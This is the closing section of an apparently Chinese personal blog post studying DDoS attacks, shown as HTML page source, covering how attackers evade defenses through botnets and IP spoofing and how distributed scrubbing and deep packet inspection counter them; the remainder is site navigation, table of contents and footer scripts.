+<h2 id="DDoS-治理"><a href="#DDoS-治理" class="headerlink" title="DDoS 治理"></a>DDoS 治理</h2><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>攻击者为了应对服务器的防护，往往又一些绕过方式来增加防护难度：</p>
+<ul>
+<li>分布式攻击，使用大量僵尸网络分散攻击流量，绕过单点防护。</li>
+<li>IP 伪造，攻击者伪造源 IP 地址，使得相应流量无法追踪到攻击者本身，使得简单源 IP 限速或封禁等手段无法有效防止攻击</li>
+</ul>
+<h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h4><p>针对上述攻击方式，除了简单的流量清洗，速率限制，采用 CDN 分散流量等做法，还可以：</p>
+<ul>
+<li>部署分布式防御，通过在多个地理位置部署防御节点，分散流量的处理，防止单点失效。在分布式防御中，即便攻击流量来自多个源，系统也能够通过大规模的分布式清洗技术来应对。</li>
+<li>深度包检测(DPI)和行为分析技术，在流量级别上检测到伪造的源 IP 和异常的流量模式。例如，如果一个源IP在短时间内发送大量的UDP请求，但这些请求不符合正常的应用模式，防火墙或清洗设备可以及时识别并阻止。</li>
+</ul>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">前置学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">类型举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E6%B8%85%E6%B4%97"><span class="toc-number">1.0.2.</span> <span class="toc-text">流量清洗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E6%B4%9E"><span class="toc-number">1.0.3.</span> <span class="toc-text">黑洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CC-%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.4.</span> <span class="toc-text">CC 攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDoS-%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">DDoS 攻击分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E8%B5%84%E6%BA%90"><span class="toc-number">2.1.</span> <span class="toc-text">攻击网络带宽资源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.1.</span> <span class="toc-text">直接攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#UDP-Flood"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">UDP Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.1.1.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.1.1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.1.1.3.</span> <span class="toc-text">攻击分类</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ICMP-Flood"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">ICMP Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.1.2.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">2.1.1.2.2.</span> <span class="toc-text">代码示例</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IGMP-Flood"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">IGMP Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.1.1.3.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">2.1.1.3.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.1.3.3.</span> <span class="toc-text">分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%92%8C%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.</span> <span class="toc-text">反射和放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ACK-%E5%8F%8D%E5%B0%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">ACK 反射攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">前置原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">2.1.2.1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.2.1.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">DNS放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.2.2.1.</span> <span class="toc-text">前置原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">2.1.2.2.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-1"><span class="toc-number">2.1.2.2.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NTP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">NTP放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.1.2.3.1.</span> <span class="toc-text">前置原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.2.3.2.</span> <span class="toc-text">攻击示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-2"><span class="toc-number">2.1.2.3.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SNMP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">SNMP放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SNMP-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.2.4.1.</span> <span class="toc-text">SNMP 放大攻击步骤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">2.1.2.4.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-3"><span class="toc-number">2.1.2.4.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90"><span class="toc-number">2.2.</span> <span class="toc-text">攻击系统资源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-TCP-%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">攻击 TCP 连接</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SYN-Flood-%E8%BF%9E%E6%8E%A5%E5%BB%BA%E7%AB%8B"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">SYN Flood - 连接建立</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.1.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.2.1.1.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-6"><span class="toc-number">2.2.1.1.3.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-4"><span class="toc-number">2.2.1.1.4.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PSH-ACK-Flood-%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%81"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">PSH + ACK Flood - 数据传送</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.1.2.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-7"><span class="toc-number">2.2.1.2.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-5"><span class="toc-number">2.2.1.2.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RST%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB-%E8%BF%9E%E6%8E%A5%E4%B8%AD%E6%AD%A2"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">RST洪水攻击 - 连接中止</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.2.1.3.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-4"><span class="toc-number">2.2.1.3.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-8"><span class="toc-number">2.2.1.3.3.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-6"><span class="toc-number">2.2.1.3.4.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Sockstress%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB%EF%BC%88Sockstress-Slowloris-Attack%EF%BC%89"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">Sockstress慢速攻击（Sockstress Slowloris Attack）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.2.1.4.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-5"><span class="toc-number">2.2.1.4.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-9"><span class="toc-number">2.2.1.4.3.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-7"><span class="toc-number">2.2.1.4.4.</span> <span class="toc-text">防护方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-SSL-%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">攻击 SSL 连接</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#THC-SSL-Dos%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">THC SSL Dos慢速攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.2.1.1.</span> <span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-10"><span class="toc-number">2.2.2.1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-8"><span class="toc-number">2.2.2.1.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSL-Flood"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">SSL Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-6"><span class="toc-number">2.2.2.2.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">2.2.2.2.2.</span> <span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-11"><span class="toc-number">2.2.2.2.3.</span> <span class="toc-text">代码示例</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-Web%E8%B5%84%E6%BA%90"><span class="toc-number">2.3.</span> <span class="toc-text">攻击 Web资源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.1.</span> <span class="toc-text">HTTP 慢速攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-1"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.2.</span> <span class="toc-text">数据处理过程攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">正则表达式拒绝服务攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-9"><span class="toc-number">2.3.2.1.1.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88Hash-DoS%EF%BC%89"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">哈希冲突拒绝服务攻击（Hash DoS）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-12"><span class="toc-number">2.3.2.2.1.</span> <span class="toc-text">代码示例</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDoS-%E6%B2%BB%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">DDoS 治理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.1.</span> <span class="toc-text">绕过方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.2.</span> <span class="toc-text">防御方式</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&text=DDOS学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&is_video=false&description=DDOS学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DDOS学习&body=Check out this article: http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&name=DDOS学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&t=DDOS学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2025
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+    </ul>
+    <ul>
+      
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_site_pv">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                本站访客数<span id="busuanzi_value_site_uv"></span>人
+        </span>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    </ul>
+  </nav>
+</div>
+
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'p5ych2022/psych.green';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
